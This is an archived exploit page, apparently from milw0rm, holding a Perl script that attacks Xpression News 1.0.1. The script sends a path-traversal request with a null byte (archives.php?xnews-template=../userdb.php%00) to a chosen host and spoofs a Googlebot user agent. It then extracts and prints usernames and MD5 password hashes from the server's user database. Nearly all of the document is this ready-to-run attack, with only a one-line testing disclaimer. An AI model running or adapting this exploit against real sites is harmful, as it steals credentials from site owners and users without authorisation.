<html><head><title>Xpression News 1.0.1 (archives.php) Remote File Disclosure Exploit</title></head><pre>#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                          XNews Remote File Disclosure Exploit                                 #
#################################################################################################
# Software: Xnews 1.0.1                                                                         #
#                                                                                               #
# Vendor: http://xpression.hogsmeade-village.com/                                               #
#                                                                                               #
# Released: 2007/01/28                                                                          #
#                                                                                               #
# Discovered &amp; Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note: The information provided in this document is for Xnews administrator                    #
# testing purposes only!                                                                        #
#                                                                                               #
# Whats up Timq, tgo, str0ke, dr max virus                                                      #
#################################################################################################

use IO::Socket;

$port = &quot;80&quot;; # connection port
$target = shift; # xpression.hogsmeade-village.com
$folder = shift; # /demo/

sub Header()
{
        print q
        {Xpression News File Disclosure Exploit - writ3r [at] gmail.com
--------------------------------------------------------------
};
}

sub Usage()
{
        print q
        {Usage: xnewsxpl.pl [target] [directory]
Example: xnewsxpl.pl xpression.hogsmeade-village.com /demo/
};
        exit();
}

Header();

if (!$target || !$folder) {
        Usage(); }

$res = false;
print &quot;[+] Connecting...\r\n&quot;;
$xpack = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $target, PeerPort =&gt; $port) || die &quot;[-] Failed to connect on exploit attempt. Exiting...\r\n&quot;;
print $xpack &quot;GET &quot;.$folder.&quot;archives.php?xnews-template=../userdb.php%00 HTTP/1.1\n&quot;;
print $xpack &quot;Host: $target\n&quot;;
print $xpack &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n&quot;;
print $xpack &quot;Accept: text/html\n&quot;;
print $xpack &quot;Connection: keep-alive\n\n\r\n&quot;;

while (&lt;$xpack&gt;)
{
        if (/(.*?)\|(.*?)\|(.*?)\|/) {
                print &quot;Username: $1\n&quot;;
                print &quot;MD5 Hash: $3\n&quot;;
                $res = true;
        exit; }

}
if ($res eq false) {
        print &quot;[-] Exploit failed - Not vulnerable\n&quot;; }

print &quot;[!] Connection to host lost...\n&quot;;

# milw0rm.com [2007-02-18]</pre></html>